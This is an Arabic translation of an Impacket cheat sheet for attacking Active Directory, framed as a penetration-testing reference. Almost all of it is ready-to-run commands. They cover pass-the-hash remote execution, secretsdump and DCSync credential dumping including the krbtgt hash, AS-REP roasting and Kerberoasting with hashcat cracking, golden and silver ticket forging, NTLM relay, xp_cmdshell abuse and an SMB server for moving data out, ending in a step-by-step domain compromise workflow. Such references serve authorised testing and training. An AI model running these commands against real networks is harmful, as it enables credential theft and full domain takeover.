<a id="-impacket---python-ad-attack-toolkit"></a>
# 🐍 Impacket - مجموعة أدوات Python لهجمات Active Directory

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Python Network Protocol Toolkit
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

يوضح الشعار اسم مجموعة الأدوات ووظيفتها في التعامل مع بروتوكولات الشبكات باستخدام Python.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو Impacket](#-what-is-impacket)
- [التثبيت](#-installation)
- [التنفيذ عن بعد](#-remote-execution)
- [استخراج بيانات الاعتماد](#-credential-dumping)
- [هجمات Kerberos](#-kerberos-attacks)
- [هجمات SMB](#-smb-attacks)
- [هجمات MSSQL](#-mssql-attacks)
- [استعلامات LDAP/AD](#-ldapad-queries)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-impacket"></a>
## 🎯 ما هو Impacket

**Impacket** مجموعة من أصناف Python للتعامل مع بروتوكولات الشبكات. تستخدم كثيرا في اختبار أمن Active Directory ‏(AD)، وتشمل:

- 🎫 **Kerberos** - تقنيات AS-REP Roasting وKerberoasting وهجمات التذاكر
- 💻 **التنفيذ عن بعد** - psexec وwmiexec وsmbexec وatexec
- 🔓 **استخراج بيانات الاعتماد** - secretsdump وDCSync
- 📁 **SMB** - عمليات الملفات وترحيل المصادقة (Relay)
- 🗄️ **MSSQL** - هجمات قواعد البيانات

<a id="key-tools"></a>
### الأدوات الرئيسية

| الأداة | الوصف |
| ------ | ------------- |
| **psexec.py** | التنفيذ عن بعد عبر SMB |
| **wmiexec.py** | التنفيذ عن بعد عبر WMI |
| **secretsdump.py** | استخراج بيانات الاعتماد والتجزئات |
| **GetNPUsers.py** | استخراج ردود AS-REP لفحص كلمات المرور |
| **GetUserSPNs.py** | استخراج تذاكر الخدمات لفحص كلمات المرور (Kerberoasting) |
| **ntlmrelayx.py** | هجمات ترحيل مصادقة NTLM |
| **smbclient.py** | عميل SMB |
| **mssqlclient.py** | عميل MSSQL |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux"></a>
### Kali Linux

```bash
# مثبت مسبقا في Kali
impacket-psexec --help

# أو التثبيت والتحديث
pip3 install impacket
pip3 install impacket --upgrade
```

<a id="from-github"></a>
### من GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# أو التثبيت لأغراض التطوير
pip3 install -e .
```

<a id="verify"></a>
### التحقق

> **ملاحظة توافق:** قد تختلف أسماء المشغلات بين حزم التوزيعات والتثبيت من المصدر. لا يعرّف ملف تهيئة الحزمة الحالي `impacket.__version__`، لذلك قد يفشل فحص الإصدار الأصلي أدناه؛ يستخدم المشروع بيانات الحزمة عبر `importlib.metadata`. راجع [تهيئة الحزمة](https://github.com/fortra/impacket/blob/master/impacket/__init__.py) و[تعريف الإصدار](https://github.com/fortra/impacket/blob/master/impacket/version.py).

```bash
# التحقق من التثبيت
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

<a id="-remote-execution"></a>
## 💻 التنفيذ عن بعد

<a id="psexecpy"></a>
### psexec.py

> **تصحيح للتعليق:** يحدد `-target-ip` عنوان IP للجهاز الهدف، وليس مشاركة SMB كما يوحي آخر تعليق في المثال. أبقيت الأمر والتعليق الأصليين مترجمين للمقارنة. [تعريف الخيار الرسمي](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

```bash
# باستخدام كلمة مرور
impacket-psexec domain.local/user:password@10.10.10.10

# باستخدام تجزئة NTLM ‏(Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# مسؤول محلي
impacket-psexec administrator:password@10.10.10.10

# تنفيذ أمر
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# استهداف مشاركة محددة
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

<a id="wmiexecpy"></a>
### wmiexec.py

```bash
# أكثر تخفيا من psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# باستخدام تجزئة
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# تنفيذ أمر
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# دون مخرجات (صامت)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

<a id="smbexecpy"></a>
### smbexec.py

```bash
# استخدام SMB للتنفيذ
impacket-smbexec domain.local/user:password@10.10.10.10

# باستخدام تجزئة
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# تحديد المشاركة
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

<a id="atexecpy"></a>
### atexec.py

```bash
# استخدام مجدول المهام
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# باستخدام تجزئة
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

<a id="dcomexecpy"></a>
### dcomexec.py

```bash
# استخدام DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# كائنات DCOM مختلفة
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

<a id="-credential-dumping"></a>
## 🔓 استخراج بيانات الاعتماد

<a id="secretsdumppy"></a>
### secretsdump.py

```bash
# استخراج البيانات من جهاز مضيف بعيد
impacket-secretsdump domain.local/user:password@10.10.10.10

# استخراج البيانات باستخدام التجزئة (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# استخراج البيانات من وحدة التحكم بالمجال (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# استخدام DCSync لمستخدم محدد فقط
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# تجزئات NTLM فقط (دون مفاتيح Kerberos)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# حفظ المخرجات في ملف
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

<a id="dcsync-attack"></a>
### هجوم DCSync

```bash
# استخدام DCSync الكامل (استخراج بيانات قاعدة AD بأكملها)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# استخدام DCSync لمستخدم محدد
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# استخدام DCSync لحساب krbtgt (للتذكرة الذهبية)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Output format: user:RID:LM:NTLM:::
```

<a id="from-local-files"></a>
### من ملفات محلية

```bash
# من NTDS.dit مع SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# من SAM مع SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# من SECURITY مع SYSTEM (أسرار LSA)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

<a id="-kerberos-attacks"></a>
## 🎫 هجمات Kerberos

<a id="as-rep-roasting-getnpuserspy"></a>
### استخراج مواد AS-REP لفحص كلمات المرور (GetNPUsers.py)

```bash
# العثور على مستخدمين دون اشتراط المصادقة المسبقة
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# باستخدام بيانات اعتماد
impacket-GetNPUsers domain.local/user:password -request

# تحديد عنوان IP لوحدة التحكم بالمجال
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# حفظ المخرجات في ملف
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# تنسيق متوافق مع hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# تنسيق متوافق مع john
impacket-GetNPUsers domain.local/user:password -request -format john
```

<a id="kerberoasting-getuserspnspy"></a>
### استخراج تذاكر الخدمات لفحص كلمات المرور (GetUserSPNs.py)

```bash
# العثور على حسابات يمكن استخراج تذاكر خدماتها لفحص كلمات المرور
impacket-GetUserSPNs domain.local/user:password

# طلب تذاكر TGS
impacket-GetUserSPNs domain.local/user:password -request

# حفظ المخرجات في ملف
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# عنوان IP لوحدة التحكم بالمجال
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# باستخدام تجزئة
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

<a id="cracking-kerberos-hashes"></a>
### كسر تجزئات Kerberos

```bash
# AS-REP (وضع hashcat رقم 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (وضع hashcat رقم 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# باستخدام john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

<a id="gettgtpy"></a>
### getTGT.py

```bash
# طلب TGT باستخدام كلمة مرور
impacket-getTGT domain.local/user:password

# طلب TGT باستخدام تجزئة
impacket-getTGT domain.local/user -hashes :NTLMHASH

# طلب TGT باستخدام مفتاح AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# يحفظ في user.ccache
# تصدير المتغير للاستخدام:
export KRB5CCNAME=user.ccache
```

<a id="ticketerpy-goldensilver-ticket"></a>
### ticketer.py (التذاكر الذهبية والفضية)

```bash
# تذكرة ذهبية (Golden Ticket)
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# تذكرة فضية (Silver Ticket)
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# استخدام التذكرة
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

<a id="-smb-attacks"></a>
## 📁 هجمات SMB

<a id="smbclientpy"></a>
### smbclient.py

```bash
# الاتصال بمشاركة
impacket-smbclient domain.local/user:password@10.10.10.10

# عرض المشاركات
# (داخل smbclient)
shares

# الاتصال بمشاركة محددة
use SHARE_NAME

# عرض الملفات
ls

# تنزيل ملف
get filename

# رفع ملف
put localfile

# تنفيذ أمر
# (إذا كانت لديك صلاحية الكتابة إلى مشاركة)
```

<a id="smbserverpy"></a>
### smbserver.py

```bash
# بدء خادم SMB (لنقل البيانات إلى الخارج)
impacket-smbserver share /tmp/share

# باستخدام المصادقة
impacket-smbserver share /tmp/share -username user -password pass

# دعم SMB2
impacket-smbserver share /tmp/share -smb2support
```

<a id="ntlmrelayxpy"></a>
### ntlmrelayx.py

> **ملاحظة إصدار:** لا تتضمن قائمة خيارات `ntlmrelayx.py` الحالية الخيار `--sam` الوارد في الأصل؛ لا تفترض دعمه في نسختك. يصف المصدر الحالي سلوك استخراج SAM ضمن خيارات SMB، وتعتمد نتيجة الترحيل على صلاحيات الحساب وإعدادات البروتوكول. [المصدر الرسمي](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

```bash
# ترحيل مصادقة أساسي
impacket-ntlmrelayx -tf targets.txt

# ترحيل المصادقة إلى SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# ترحيل المصادقة وتنفيذ أمر
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# استخراج SAM عند ترحيل المصادقة
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# ترحيل المصادقة إلى LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# مع Responder:
# 1. Edit Responder.conf, set SMB = Off, HTTP = Off
# 2. Run: responder -I eth0
# 3. Run: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="-mssql-attacks"></a>
## 🗄️ هجمات MSSQL

<a id="mssqlclientpy"></a>
### mssqlclient.py

```bash
# الاتصال بمصادقة Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# الاتصال بمصادقة SQL
impacket-mssqlclient sa:password@10.10.10.10

# باستخدام تجزئة
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# الاتصال بقاعدة بيانات محددة
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

<a id="mssql-commands"></a>
### أوامر MSSQL

> **توضيح للسياق:** `enable_xp_cmdshell` و`xp_cmdshell whoami` هنا أوامر مساعدة داخل سطر أوامر `mssqlclient`، وليستا جملتي T-SQL جاهزتين كما قد يوحي وسم الكتلة `sql`. الاستعلامان `SELECT` جملتا SQL. [تنفيذ سطر الأوامر الرسمي](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py).

```sql
-- تفعيل xp_cmdshell
enable_xp_cmdshell

-- تنفيذ أمر
xp_cmdshell whoami

-- استعلام SQL
SELECT * FROM master.sys.databases

-- قراءة ملف
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

<a id="-ldapad-queries"></a>
## 📂 استعلامات LDAP/AD

<a id="getaduserspy"></a>
### GetADUsers.py

```bash
# عرض جميع المستخدمين
impacket-GetADUsers domain.local/user:password -all

# تحديد وحدة تحكم بالمجال
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# باستخدام تجزئة
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

<a id="lookupsidpy"></a>
### lookupsid.py

```bash
# تعداد المستخدمين عبر تجربة قيم SID
impacket-lookupsid domain.local/user:password@10.10.10.10

# تحديد نطاق SID
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

<a id="finddelegationpy"></a>
### findDelegation.py

```bash
# العثور على إعدادات التفويض
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="authentication-options"></a>
### خيارات المصادقة

> **توضيح للمفتاح:** يدعم `-aesKey` في الأدوات الموثقة مفاتيح Kerberos بطول 128 أو 256 بت؛ تسمية AES256 في الجدول أضيق من نطاق الخيار. [تعريف الخيار في psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

| الخيار | الوصف |
| -------- | ------------- |
| `user:password` | المصادقة بكلمة مرور |
| `-hashes :NTLM` | تجزئة NTLM (المصادقة باستخدام التجزئة: Pass-the-Hash) |
| `-hashes LM:NTLM` | تجزئتا LM:NTLM |
| `-aesKey KEY` | مفتاح AES256 |
| `-k -no-pass` | Kerberos باستخدام ذاكرة التذاكر ccache |

<a id="common-options"></a>
### الخيارات الشائعة

| الخيار | الوصف |
| -------- | ------------- |
| `-dc-ip IP` | عنوان IP لوحدة التحكم بالمجال |
| `-target-ip IP` | عنوان IP للهدف |
| `-debug` | تفعيل مخرجات التنقيح |

<a id="remote-execution-summary"></a>
### ملخص التنفيذ عن بعد

تقديرات التخفي أدناه وصف تقريبي في الأصل، وليست ضمانا لعدم الرصد؛ تختلف الآثار المرئية بحسب التكوين والمراقبة والصلاحيات.

| الأداة | الطريقة | التخفي |
| ------ | -------- | --------- |
| psexec.py | SMB مع خدمة | منخفض |
| wmiexec.py | WMI | متوسط |
| smbexec.py | SMB | منخفض |
| atexec.py | مجدول المهام (Task Scheduler) | مرتفع |
| dcomexec.py | DCOM | متوسط |

<a id="attack-workflow"></a>
### خطوات الهجوم

```bash
# 1. تعداد المستخدمين (AS-REP Roast)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. استخراج تذاكر الخدمات (Kerberoast)
impacket-GetUserSPNs domain.local/user:password -request

# 3. كسر التجزئات
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. استخدام PtH أو كلمة مرور
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. استخراج بيانات الاعتماد
impacket-secretsdump domain.local/admin:password@DC01

# 6. استخدام DCSync لجميع التجزئات
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

<a id="-resources"></a>
## 📚 المصادر

- [مستودع Impacket على GitHub](https://github.com/fortra/impacket)
- [أمثلة Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [الويكي](https://github.com/fortra/impacket/wiki)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [BloodHound](../../BloodHound/translations/README.ar.md)
- [Mimikatz](../../Mimikatz/translations/README.ar.md)
- [Hashcat](../../Hashcat/translations/README.ar.md)

---

<p align="center">
  <b>🐍 أتقن هجمات Active Directory باستخدام Python!</b><br>
  <i>Impacket - مجموعة أدوات أساسية لمختبر الاختراق</i>
</p>
